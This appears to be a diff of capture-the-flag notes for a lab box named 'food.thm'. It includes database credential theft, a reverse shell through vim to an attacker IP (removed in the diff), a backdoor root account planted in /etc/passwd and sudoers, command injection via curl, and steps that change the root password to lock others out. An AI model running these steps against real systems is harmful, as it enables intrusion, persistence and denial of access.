@@ -1,17 +1,17 @@
 # Food
+## Ramen
  1. `mysql -u root -h food.thm -p` password is `root`
  2. `select * from user` now you have user `ramen : noodlesRTheBest`
  3. `ssh ramen@food.thm`
  4. `nc -nvlp 8888`
- 5. 
-```
-vim -c ':!python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.85.10",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'&
-```
- 7. now you are root
- 8. `passwd` and change root passwd
- 9. `vim /etc/sudoers` and delete sudo perms
- 10. `find / -name flag 2>/dev/null`
+ 5. ### Universal Priv. Esc.
+ 6. `/usr/bin/vim.basic /etc/passwd` and add `user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash` password is `pass123`
+ 7. `/usr/bin/vim.basic /etc/sudoers` and add `user3 ALL=(ALL:ALL) ALL`
+## Bread
+1. `curl -d "command" food.thm:15065/api/cmd`
 
+### Not Tested Priv. Esc.
+1. https://www.exploit-db.com/exploits/41154
 # Flags
 1. /root/flag
 2. /root/.profile
